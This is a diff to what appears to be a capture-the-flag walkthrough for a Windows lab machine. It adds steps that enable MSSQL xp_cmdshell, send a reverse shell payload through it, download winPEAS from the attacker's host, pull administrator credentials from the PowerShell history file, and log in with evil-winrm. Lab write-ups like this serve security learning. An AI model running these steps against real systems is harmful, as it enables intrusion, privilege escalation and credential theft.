@@ -108,5 +108,57 @@ impacket-mssqlclient sql_svc:'M3g4c0rp123'@{IP_ADDRESS} -windows-auth
 ```
 
 
--> follow the https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
+-> follow the https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/ , for documentation fo **xp_cmdshell**.
+
+```bash
+#Enable xp_cmdshell first after login
+enable_xp_cmdshell
+xp_cmdshell whoami
+```
+
+-> https://www.revshells.com/ for generating reverse shell payload for a given situation (PS, bash, PHP, netcat, etc)
+
+```bash
+# Copy the payload after the command
+xp_cmdshell {PAYLOAD}
+
+# make sure u had a listener ready before
+```
+
+-> since we need to bring winpeas, to find vulnerabilities to exploit in the machine
+
+```bash
+# Inside the folder that has winPEASany.exe
+python -m http.server 8000
+```
+
+-> from the connected reverse shell, we navigate into C:\backups, because when I tried to curl into other folders it wouldn't work
+
+```bash
+# in C:\backups
+curl.exe http://{tun0-interface-IP}/winPEASSany.exe -o winpeas.exe
+```
+
+-> run winPEAS
+
+```css
+# inside winPEAS we found
+??????????? PowerShell Settings (T1059.001)
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 79B
+
+```
+
+-> this is the file that stores powershell history inputs, when we cat it we can find the credentials of the administrator: `MEGACORP_4dm1n!!`
+
+```bash
+# connect using evil-winrm
+evil-winrm -i {IP_ADDRESS} -u administrator -p MEGACORP_4dm1n!!
+```
 
